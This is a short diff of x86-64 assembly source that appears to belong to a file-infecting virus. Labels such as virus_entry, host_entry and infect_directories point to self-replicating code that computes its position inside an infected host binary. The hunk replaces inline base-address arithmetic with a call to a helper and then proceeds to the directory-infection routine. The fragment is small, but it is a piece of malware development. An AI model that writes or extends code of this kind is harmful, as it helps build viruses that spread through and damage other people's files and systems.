@@ -163,14 +163,8 @@ _start:
     ; NASM automatically creates a <name>_size constant for strucs
     sub rbp, data_size
 
-    lea rax, [rel _start]
-    mov rdx, [rel virus_entry]
-    sub rax, rdx
-    add rax, [rel host_entry]
+    call get_base_address
     push rax
-
-    ; call get_base_address
-    ; mov data(base_address), rax
 
     lea r15, [rel infect_directories]
     .open_directory:
